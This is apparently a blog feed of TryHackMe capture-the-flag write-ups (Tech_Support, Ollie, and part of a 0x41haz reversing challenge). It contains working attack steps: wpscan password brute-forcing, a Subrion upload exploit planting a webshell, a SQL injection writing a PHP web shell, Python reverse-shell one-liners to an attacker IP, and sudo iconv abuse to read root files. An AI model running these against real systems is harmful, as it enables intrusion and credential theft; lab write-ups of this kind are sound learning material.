+<p>Checking out findings</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># /test</span>
+http://10.10.203.0/test/ <span class="nt">--</span><span class="o">&gt;</span> gives sample of the <span class="nb">test </span>error page
+<span class="c"># nothing important</span>
+
+<span class="c"># /phpinfo.php</span>
+10.10.203.0/phpinfo.php  <span class="nt">--</span><span class="o">&gt;</span> gives all the information about the server
+CONTEXT_DOCUMENT_ROOT 	/var/www/html 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Wordpress Enumeration</span>
+
+http://10.10.203.0/wordpress/  <span class="nt">--</span><span class="o">&gt;</span> using wpscan to enumerate
+
+wpscan <span class="nt">--url</span> http://10.10.203.0/wordpress/ <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 
+_______________________________________________________________
+         __          _______   _____
+         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
+          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®
+           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.20
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.203.0/wordpress/ [10.10.203.0]
+[+] Started: Wed Apr 20 11:39:49 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.203.0/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.203.0/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.10.203.0/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.203.0/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.203.0/wordpress/, Match: '</span>wp-includes<span class="se">\/</span>js<span class="se">\/</span>wp-emoji-release.min.js?ver<span class="o">=</span>5.7.2<span class="s1">'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.203.0/wordpress/, Match: '</span>WordPress 5.7.2
+
+<span class="o">[</span>+] WordPress theme <span class="k">in </span>use: teczilla
+ | Location: http://10.10.203.0/wordpress/wp-content/themes/teczilla/
+ | Last Updated: 2021-11-17T00:00:00.000Z
+ | Readme: http://10.10.203.0/wordpress/wp-content/themes/teczilla/readme.txt
+ | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 1.1.3
+ | Style URL: http://10.10.203.0/wordpress/wp-content/themes/teczilla/style.css?ver<span class="o">=</span>5.7.2
+ | Style Name: Teczilla
+ | Style URI: https://www.avadantathemes.com/product/teczilla-free/
+ | Description: Teczilla is a creative, fully customizable and multipurpose theme that you can use to create any kin...
+ | Author: avadantathemes
+ | Author URI: https://www.avadantathemes.com/
+ |
+ | Found By: Css Style In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |
+ | Version: 1.0.4 <span class="o">(</span>80% confidence<span class="o">)</span>
+ | Found By: Style <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |  - http://10.10.203.0/wordpress/wp-content/themes/teczilla/style.css?ver<span class="o">=</span>5.7.2, Match: <span class="s1">'Version: 1.0.4'</span>
+
+<span class="o">[</span>+] Enumerating All Plugins <span class="o">(</span>via Passive Methods<span class="o">)</span>
+
+<span class="o">[</span>i] No plugins Found.
+
+<span class="o">[</span>+] Enumerating Config Backups <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+ Checking Config Backups - Time: 00:00:06 &lt;<span class="o">===============================================================================================================&gt;</span> <span class="o">(</span>137 / 137<span class="o">)</span> 100.00% Time: 00:00:06
+
+<span class="o">[</span>i] No Config Backups Found.
+
+<span class="o">[</span>+] Enumerating Users <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+ Brute Forcing Author IDs - Time: 00:00:03 &lt;<span class="o">================================================================================================================&gt;</span> <span class="o">(</span>10 / 10<span class="o">)</span> 100.00% Time: 00:00:03
+
+<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:
+
+<span class="o">[</span>+] support
+ | Found By: Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |  - http://10.10.203.0/wordpress/index.php/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] Performing password attack on Xmlrpc against 1 user/s
+^Cying support / dimple Time: 00:09:27 &lt;                                                                                                             <span class="o">&gt;</span> <span class="o">(</span>1500 / 14344392<span class="o">)</span>  0.01%  ETA: ??:??:??
+<span class="o">[</span>i] No Valid Passwords Found.
+
+<span class="o">[!]</span> No WPScan API Token given, as a result vulnerability data has not been output.                                                                   <span class="o">&gt;</span> <span class="o">(</span>1504 / 14344392<span class="o">)</span>  0.01%  ETA: ??:??:??
+<span class="o">[!]</span> You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+<span class="o">[</span>+] Finished: Wed Apr 20 11:50:00 2022
+<span class="o">[</span>+] Requests Done: 1695
+<span class="o">[</span>+] Cached Requests: 7
+<span class="o">[</span>+] Data Sent: 859.634 KB
+<span class="o">[</span>+] Data Received: 1.442 MB
+<span class="o">[</span>+] Memory used: 238.305 MB
+<span class="o">[</span>+] Elapsed <span class="nb">time</span>: 00:10:11
+
+Scan Aborted: Canceled by User
+
+<span class="c"># Nothing important was found except support user.</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># /subrion
+
+Fix subrion site, /subrion doesnt work, edit from panel
+
+but /subrion redirects us to {our_local_ip}/subrion/subrion
+
+tried to look into burp and all for long time.
+
+guessed /subrion/panel may work.
+
+And it did!
+
+we already have creds
+
+admin:Scam2021
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Subrion enumeration gives</span>
+
+Subrion version 4.2.1 installed. Cheers!
+
+searchsploit  Subrion   
+<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                              |  Path
+<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Subrion 3.x - Multiple Vulnerabilities                      | php/webapps/38525.txt
+Subrion 4.2.1 - <span class="s1">'Email'</span> Persistant Cross-Site Scripting     | php/webapps/47469.txt
+Subrion Auto Classifieds - Persistent Cross-Site Scripting  | php/webapps/14391.txt
+SUBRION CMS - Multiple Vulnerabilities                      | php/webapps/17390.txt
+Subrion CMS 2.2.1 - Cross-Site Request Forgery <span class="o">(</span>Add Admin<span class="o">)</span>  | php/webapps/21267.txt
+subrion CMS 2.2.1 - Multiple Vulnerabilities                | php/webapps/22159.txt
+Subrion CMS 4.0.5 - Cross-Site Request Forgery <span class="o">(</span>Add Admin<span class="o">)</span>  | php/webapps/47851.txt
+Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Per | php/webapps/40553.txt
+Subrion CMS 4.0.5 - SQL Injection                           | php/webapps/40202.txt
+Subrion CMS 4.2.1 - <span class="s1">'avatar[path]'</span> XSS                      | php/webapps/49346.txt
+Subrion CMS 4.2.1 - Arbitrary File Upload                   | php/webapps/49876.py
+Subrion CMS 4.2.1 - Cross-Site Scripting                    | php/webapps/45150.txt
+<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+
+
+
+searchsploit  <span class="nt">-m</span> php/webapps/49876.py
+  Exploit: Subrion CMS 4.2.1 - Arbitrary File Upload
+      URL: https://www.exploit-db.com/exploits/49876
+     Path: /usr/share/exploitdb/exploits/php/webapps/49876.py
+File Type: Python script, ASCII text executable, with very long lines <span class="o">(</span>956<span class="o">)</span>
+
+Copied to: /home/kali/TryHackMe/Tech_Support/49876.py
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Gaining Access</span>
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/TryHackMe/Tech_Support]
+└─<span class="nv">$ </span>python3 exploit.py 
+<span class="o">[</span>+] Specify an url target
+<span class="o">[</span>+] Example usage: exploit.py <span class="nt">-u</span> http://target-uri/panel
+<span class="o">[</span>+] Example <span class="nb">help </span>usage: exploit.py <span class="nt">-h</span>
+                                                                                              
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/TryHackMe/Tech_Support]
+└─<span class="nv">$ </span>python3 exploit.py <span class="nt">-h</span>
+Usage: exploit.py <span class="o">[</span>options]
+
+Options:
+  <span class="nt">-h</span>, <span class="nt">--help</span>            show this <span class="nb">help </span>message and <span class="nb">exit</span>
+  <span class="nt">-u</span> URL, <span class="nt">--url</span><span class="o">=</span>URL     Base target uri http://target/panel
+  <span class="nt">-l</span> USER, <span class="nt">--user</span><span class="o">=</span>USER  User credential to login
+  <span class="nt">-p</span> PASSW, <span class="nt">--passw</span><span class="o">=</span>PASSW
+                        Password credential to login
+                                                                                              
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/TryHackMe/Tech_Support]
+└─<span class="nv">$ </span>python3 exploit.py <span class="nt">-u</span> http://10.10.203.0/subrion/panel/ <span class="nt">-l</span> admin <span class="nt">-p</span> Scam2021
+<span class="o">[</span>+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
+
+<span class="o">[</span>+] Trying to connect to: http://10.10.203.0/subrion/panel/
+<span class="o">[</span>+] Success!
+<span class="o">[</span>+] Got CSRF token: UiWXFvBttTMBZWjVxBCfNFJsnoX6hxdNrOeMwlvW
+<span class="o">[</span>+] Trying to log <span class="k">in</span>...
+<span class="o">[</span>+] Login Successful!
+
+<span class="o">[</span>+] Generating random name <span class="k">for </span>Webshell...
+<span class="o">[</span>+] Generated webshell name: rlccyhomkqkrtwl
+
+<span class="o">[</span>+] Trying to Upload Webshell..
+<span class="o">[</span>+] Upload Success... Webshell path: http://10.10.203.0/subrion/panel/uploads/rlccyhomkqkrtwl.phar 
+
+<span class="nv">$ </span>
+
+Yay we got our shell
+
+Stablizing shell
+
+<span class="nv">$ </span>which python3
+/usr/bin/python3
+
+<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.253.221",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+</code></pre></div></div>
+
+<h2 id="shell-www-data">Shell [www-data]</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#  Shell Stablization</span>
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/TryHackMe/Tech_Support]
+└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 4444                                
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.8.253.221] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.203.0] 41394
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+
+$ python3 -c '</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
+
+www-data@TechSupport:/var/www/html/subrion/uploads$
+
+www-data@TechSupport:/var/www/html/subrion/uploads$ export TERM=xterm
+export TERM=xterm
+
+ctrl+z
+zsh: suspended  nc -nlvp 4444
+
+
+┌──(kali㉿kali)-[~/TryHackMe/Tech_Support]
+└─$ stty raw -echo;fg       
+[1]  + continued  nc -nlvp 4444
+
+www-data@TechSupport:/var/www/html/subrion/uploads$
+
+</span></code></pre></div></div>
+
+<p>Looking around wordpress site gives this info</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># User Enumeration</span>
+
+www-data@TechSupport:/var/www/html/wordpress<span class="nv">$ </span><span class="nb">ls
+</span>index.php	 wp-blog-header.php    wp-includes	  wp-settings.php
+license.txt	 wp-comments-post.php  wp-links-opml.php  wp-signup.php
+readme.html	 wp-config.php	       wp-load.php	  wp-trackback.php
+wp-activate.php  wp-content	       wp-login.php	  xmlrpc.php
+wp-admin	 wp-cron.php	       wp-mail.php
+
+www-data@TechSupport:/var/www/html/wordpress<span class="nv">$ </span><span class="nb">cat </span>wp-config.php
+
+// <span class="k">**</span> MySQL settings - You can get this info from your web host <span class="k">**</span> //
+/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
+define<span class="o">(</span> <span class="s1">'DB_NAME'</span>, <span class="s1">'wpdb'</span> <span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL database username <span class="k">*</span>/
+define<span class="o">(</span> <span class="s1">'DB_USER'</span>, <span class="s1">'support'</span> <span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL database password <span class="k">*</span>/
+define<span class="o">(</span> <span class="s1">'DB_PASSWORD'</span>, <span class="s1">'ImAScammerLOL!123!'</span> <span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
+define<span class="o">(</span> <span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span> <span class="o">)</span><span class="p">;</span>
+
+
+scamsite@TechSupport:/home<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> /bin/bash
+root:x:0:0:root:/root:/bin/bash
+scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash
+
+<span class="c"># Gives 2 users root and scamsite</span>
+
+<span class="c"># trying using same creds we got </span>
+
+www-data@TechSupport:/home<span class="nv">$ </span>su scamsite
+Password: 
+scamsite@TechSupport:/home<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>scamsite on TechSupport:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User scamsite may run the following commands on TechSupport:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/iconv
+
+
+<span class="c"># more info about iconv</span>
+
+scamsite@TechSupport:~/websvr<span class="nv">$ </span>/usr/bin/iconv <span class="nt">--help</span>
+Usage: iconv <span class="o">[</span>OPTION...] <span class="o">[</span>FILE...]
+Convert encoding of given files from one encoding to another.
+
+ Input/Output format specification:
+  <span class="nt">-f</span>, <span class="nt">--from-code</span><span class="o">=</span>NAME       encoding of original text
+  <span class="nt">-t</span>, <span class="nt">--to-code</span><span class="o">=</span>NAME         encoding <span class="k">for </span>output
+
+ Information:
+  <span class="nt">-l</span>, <span class="nt">--list</span>                 list all known coded character sets
+
+ Output control:
+  <span class="nt">-c</span>                         omit invalid characters from output
+  <span class="nt">-o</span>, <span class="nt">--output</span><span class="o">=</span>FILE          output file
+  <span class="nt">-s</span>, <span class="nt">--silent</span>               suppress warnings
+      <span class="nt">--verbose</span>              print progress information
+
+  -?, <span class="nt">--help</span>                 Give this <span class="nb">help </span>list
+      <span class="nt">--usage</span>                Give a short usage message
+  <span class="nt">-V</span>, <span class="nt">--version</span>              Print program version
+
+Mandatory or optional arguments to long options are also mandatory or optional
+<span class="k">for </span>any corresponding short options.
+
+For bug reporting instructions, please see:
+&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
+
+
+<span class="c"># GTFObins give</span>
+Sudo
+
+If the binary is allowed to run as superuser by <span class="nb">sudo</span>, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+    <span class="nv">LFILE</span><span class="o">=</span>file_to_read
+    ./iconv <span class="nt">-f</span> 8859_1 <span class="nt">-t</span> 8859_1 <span class="s2">"</span><span class="nv">$LFILE</span><span class="s2">"</span>
+
+
+<span class="c"># Lets check it out</span>
+
+scamsite@TechSupport:~<span class="nv">$ </span><span class="nb">echo </span>TEST <span class="o">&gt;</span> test.txt
+
+/usr/bin/iconv <span class="nt">-f</span> 8859_1 <span class="nt">-t</span> 8859_1 ./test.txt
+TEST
+
+
+Getting the root flag
+
+<span class="nb">sudo</span> /usr/bin/iconv <span class="nt">-f</span> 8859_1 <span class="nt">-t</span> 8859_1 /root/root.txt
+851b8233a8c0&lt;Check it out youself&gt;9bf1ed02790b
+
+checking <span class="k">for </span>other files
+
+root <span class="nb">hash
+</span>root:<span class="nv">$6$.</span>jnArnoS<span class="nv">$vhMAUiCBPWNT</span>/G69DcbUJiD93STewGXfZybhl15/3B2h4H9iuwQVk4o77eHVD5.aDPWQEZgR22FFPvzgsQ/KV1:18775:0:99999:7:::
+
+root id_rsa
+<span class="nb">sudo</span> /usr/bin/iconv <span class="nt">-f</span> 8859_1 <span class="nt">-t</span> 8859_1 /root/.ssh/id_rs
+Yeah its there <span class="o">!</span>
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/TryHackMe/Tech_Support]
+└─<span class="nv">$ </span>ssh root@10.10.203.0 <span class="nt">-i</span> id_rsa
+root@10.10.203.0<span class="s1">'s password: 
+
+but still ask password
+</span></code></pre></div></div>
+
+<p>That all for this room hope you learnt something !</p>]]></content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><summary type="html"><![CDATA[VOiD XD]]></summary></entry><entry><title type="html">Ollie</title><link href="http://localhost:4000/new_blog/posts/Ollie/" rel="alternate" type="text/html" title="Ollie" /><published>2022-04-08T00:00:00+00:00</published><updated>2022-04-08T00:00:00+00:00</updated><id>http://localhost:4000/new_blog/posts/Ollie</id><content type="html" xml:base="http://localhost:4000/new_blog/posts/Ollie/"><![CDATA[<blockquote>
+  <p>VOiD XD</p>
+</blockquote>
+
+<p>My IP : 10.8.253.221
+Target IP : 10.10.188.177</p>
+
+<h2 id="rustscan">Rustscan</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack
+80/tcp   open  http    syn-ack
+1337/tcp open  waste   syn-ack
+
+
+</code></pre></div></div>
+
+<h2 id="port-1337">PORT 1337</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 10.10.188.177 1337                                                         1 ⨯
+Hey stranger, I<span class="s1">'m Ollie, protector of panels, lover of deer antlers.
+
+What is your name? olie
+What'</span>s up, Olie! It<span class="s1">'s been a while. What are you here for? flag
+Ya'</span> know what? Olie. If you can answer a question about me, I might have something <span class="k">for </span>you.
+
+
+What breed of dog am I? I<span class="s1">'ll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog
+You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
+Please hold on a minute
+Ok, I'</span>m back.
+After a lengthy discussion, we<span class="s1">'ve come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.
+
+                    Username: admin
+
+                    Password: OllieUnixMontgomery!
+
+PS: Good luck and next time bring some treats!
+
+</span></code></pre></div></div>
+
+<h2 id="port-80">PORT 80</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.188.177/index.php?page<span class="o">=</span>login
+
+checking exploits gives
+https://fluidattacks.com/advisories/mercury/
+
+http://10.10.188.177/index.php?page<span class="o">=</span>administration&amp;section<span class="o">=</span>routing&amp;subnetId<span class="o">=</span>bgp&amp;sPage<span class="o">=</span>1
+
+<span class="s2">" union all select 1,2,3,group_concat(user,0x3a,file_priv) from mysql.user -- -
+
+ 1/3 (debian-sys-maint:Y,
+    mysql.infoschema:N,
+    mysql.session:N,
+    mysql.sys:N,
+    ollie_mysql:Y,
+    phpipam_ollie:Y,
+    root:Y)
+
+we have file permissions
+
+we have a simple web shell
+&lt;?php system(</span><span class="nv">$_GET</span><span class="s2">["</span>cmd<span class="s2">"]); ?&gt;
+
+"</span> Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE <span class="s1">'/var/www/html/shell.php'</span> <span class="nt">--</span> -
+
+http://10.10.188.177/shell.php?cmd<span class="o">=</span>which%20python3
+
+python3 <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.253.221",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</span>
+</code></pre></div></div>
+
+<h2 id="shell-www-data">Shell [www-data]</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su ollie
+OllieUnixMontgomery!
+
+ollie@hackerdog:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+THM<span class="o">{</span>Ollie_boi_is_daH_Cut3st<span class="o">}</span>
+
+pspy gives
+2022/04/21 16:13:00 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>37817  | <span class="o">(</span>feedme<span class="o">)</span> 
+
+ollie@hackerdog:/usr/bin<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> feedme 
+<span class="nt">-rwxrw-r--</span> 1 root ollie 30 Feb 12 02:31 feedme
+
+<span class="c"># cat root.txt</span>
+THM<span class="o">{</span>Ollie_Luvs_Chicken_Fries<span class="o">}</span>
+</code></pre></div></div>]]></content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><summary type="html"><![CDATA[VOiD XD]]></summary></entry><entry><title type="html">0x41haz (tryhackme)</title><link href="http://localhost:4000/new_blog/posts/0x41haz-(Tryhackme)/" rel="alternate" type="text/html" title="0x41haz (tryhackme)" /><published>2022-04-04T00:00:00+00:00</published><updated>2022-04-04T00:00:00+00:00</updated><id>http://localhost:4000/new_blog/posts/0x41haz-(Tryhackme)</id><content type="html" xml:base="http://localhost:4000/new_blog/posts/0x41haz-(Tryhackme)/"><![CDATA[<blockquote>
+  <p>VOiD XD</p>
+</blockquote>
+
+<p>This is short writup for <a href="https://tryhackme.com/room/0x41haz">0x41haz</a> (Simple Reversing Challenge) on <a href="https://tryhackme.com">tryhackme</a>
+Go check it out.</p>
+
+<h3 id="binary-0x41haz0x41haz">Binary [0x41haz.0x41haz]</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># first some basic file checks</span>
+file 0x41haz.0x41haz
+0x41haz.0x41haz: ELF 64-bit MSB <span class="k">*</span>unknown <span class="nb">arch </span>0x3e00<span class="k">*</span> <span class="o">(</span>SYSV<span class="o">)</span>
+
+<span class="c"># Simple google search for "MSB *unknown arch 0x3e00* (SYSV)" returns this intresting blog.</span>
+https://pentester.blog/?p<span class="o">=</span>247
+We get to know that 6th byte tells about endianness changing it to 01 makes elf readable.
+
+I used ghex to change 6th byte you can use any hex editor of your choice.
+
+file 0x41haz.0x41haz
+0x41haz.0x41haz: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>6c9f2e85b64d4f12b91136ffb8e4c038f1dc6dcd, <span class="k">for </span>GNU/Linux 3.2.0, stripped
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># running binary with dummy password </span>
+┌──<span class="o">(</span>void㉿kali<span class="o">)</span>-[~/tryhackme/0x41haz]
+└─<span class="nv">$ </span>./0x41haz.0x41haz
+<span class="o">=======================</span>
+Hey , Can You Crackme ?
+<span class="o">=======================</span>
+Its jus a simple binary 
+
+Tell Me the Password :
+dummypass
+Is it correct , I dont think so.
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># decompiling binary using radare2</span>
+
+r2 0x41haz.0x41haz
+
+<span class="o">[</span>0x00001080]&gt; aaa
+<span class="o">[</span>x] Analyze all flags starting with sym. and entry0 <span class="o">(</span>aa<span class="o">)</span>
+<span class="o">[</span>x] Analyze <span class="k">function </span>calls <span class="o">(</span>aac<span class="o">)</span>
+<span class="o">[</span>x] Analyze len bytes of instructions <span class="k">for </span>references <span class="o">(</span>aar<span class="o">)</span>
+<span class="o">[</span>x] Finding and parsing C++ vtables <span class="o">(</span>avrr<span class="o">)</span>
+<span class="o">[</span>x] Type matching analysis <span class="k">for </span>all functions <span class="o">(</span>aaft<span class="o">)</span>
+<span class="o">[</span>x] Propagate noreturn information <span class="o">(</span>aanr<span class="o">)</span>
+<span class="o">[</span>x] Use <span class="nt">-AA</span> or aaaa t
+
+<span class="o">[</span>0x00001165]&gt; pdf @ main
+            <span class="p">;</span> DATA XREF from entry0 @ 0x109d
+/ 219: int main <span class="o">(</span>int argc, char <span class="k">**</span>argv, char <span class="k">**</span>envp<span class="o">)</span><span class="p">;</span>
+|           <span class="p">;</span> var char <span class="k">*</span>s @ rbp-0x40
+|           <span class="p">;</span> var int64_t var_16h @ rbp-0x16
+|           <span class="p">;</span> var int64_t var_eh @ rbp-0xe
+|           <span class="p">;</span> var int64_t var_ah @ rbp-0xa
+|           <span class="p">;</span> var size_t var_8h @ rbp-0x8
+|           <span class="p">;</span> var int64_t var_4h @ rbp-0x4
+|           0x00001165      55             push rbp
+|           0x00001166      4889e5         mov rbp, rsp
+|           0x00001169      4883ec40       sub rsp, 0x40
+|           0x0000116d      48b832404032.  movabs rax, 0x6667243532404032 <span class="p">;</span> <span class="s1">'2@@25$gf'</span>
+|           0x00001177      488945ea       mov qword <span class="o">[</span>var_16h], rax
+|           0x0000117b      c745f2735426.  mov dword <span class="o">[</span>var_eh], 0x40265473 <span class="p">;</span> <span class="s1">'sT&amp;@'</span>
+|           0x00001182      66c745f64c00   mov word <span class="o">[</span>var_ah], 0x4c     <span class="p">;</span> <span class="s1">'L'</span>
+|           0x00001188      488d3d790e00.  lea rdi, str._nHey___Can_You_Crackme___n <span class="p">;</span> 0x2008 <span class="p">;</span> <span class="s2">"=======================</span><span class="se">\n</span><span class="s2">Hey , Can You Crackme ?</span><span class="se">\n</span><span class="s2">======================="</span> <span class="p">;</span> const char <span class="k">*</span>s
+|           0x0000118f      e89cfeffff     call sym.imp.puts           <span class="p">;</span> int puts<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
+|           0x00001194      488d3db50e00.  lea rdi, str.Its_jus_a_simple_binary__n <span class="p">;</span> 0x2050 <span class="p">;</span> <span class="s2">"It's jus a simple binary </span><span class="se">\n</span><span class="s2">"</span> <span class="p">;</span> const char <span class="k">*</span>s
+|           0x0000119b      e890feffff     call sym.imp.puts           <span class="p">;</span> int puts<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
+|           0x000011a0      488d3dc40e00.  lea rdi, str.Tell_Me_the_Password_: <span class="p">;</span> 0x206b <span class="p">;</span> <span class="s2">"Tell Me the Password :"</span> <span class="p">;</span> const char <span class="k">*</span>s
+|           0x000011a7      e884feffff     call sym.imp.puts           <span class="p">;</span> int puts<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
+|           0x000011ac      488d45c0       lea rax, <span class="o">[</span>s]
+|           0x000011b0      4889c7         mov rdi, rax                <span class="p">;</span> char <span class="k">*</span>s
+|           0x000011b3      b800000000     mov eax, 0
+|           0x000011b8      e893feffff     call sym.imp.gets           <span class="p">;</span> char <span class="k">*</span>gets<span class="o">(</span>char <span class="k">*</span>s<span class="o">)</span>
+|           0x000011bd      488d45c0       lea rax, <span class="o">[</span>s]
+|           0x000011c1      4889c7         mov rdi, rax                <span class="p">;</span> const char <span class="k">*</span>s
+|           0x000011c4      e877feffff     call sym.imp.strlen         <span class="p">;</span> size_t strlen<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
+|           0x000011c9      8945f8         mov dword <span class="o">[</span>var_8h], eax
+|           0x000011cc      837df80d       cmp dword <span class="o">[</span>var_8h], 0xd
+|       ,<span class="o">=</span>&lt; 0x000011d0      7416           je 0x11e8
